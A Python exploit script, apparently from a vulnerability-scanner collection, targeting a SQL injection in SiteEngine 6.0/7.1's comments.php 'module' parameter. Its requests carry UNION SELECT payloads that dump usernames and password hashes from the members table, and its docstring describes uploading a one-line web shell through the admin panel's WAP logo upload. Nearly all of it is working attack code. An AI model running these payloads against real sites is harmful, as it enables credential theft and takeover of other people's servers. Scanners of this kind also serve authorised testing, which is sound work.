#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: SiteEngine 6.0 & 7.1 SQL注入漏洞
referer: http://0day5.com/archives/135
author: Lucifer
description: 文件comments.php中,参数module存在SQL注入,管理后台:http://server/admin/
系统维护—> wap设置—> 请上传wap logo图 (有大小限制,10k以内,传一句话即可) —>
确定—>马上浏览—>看图片属性即为一句话地址。
'''
import sys
import requests



class siteengine_comments_module_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/comments.php?id=1&module=news+m,boka_newsclass+c+WhErE+1=2+UniOn+sElEct+1,2,Group_Concat(username,0x7e,password,0x7e,Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26+From+boka_members%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在SiteEngine6.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl
            vulnurl = self.url + "/comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+WhEre+1=2+UniOn+sElEct+1,2,Group_Concat(username, 0x7e, password, Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39+From+boka_members%23"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在SiteEngine7.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl
            vulnurl = self.url + "/comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+WhEre+1=2+UniOn+sElEct+1,2,Group_Concat(username, 0x7e, password, Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27+From+boka_members%23"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在SiteEngine7.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl
            vulnurl = self.url + "/comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+WhEre+1=2+UniOn+sElEct+1,2,Group_Concat(username, 0x7e, password, Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38+From+boka_members%23"
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在SiteEngine7.0 comments.php SQL注入漏洞...(高危)\tpayload: "+vulnurl
        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = siteengine_comments_module_sqli_BaseVerify(sys.argv[1])
    testVuln.run()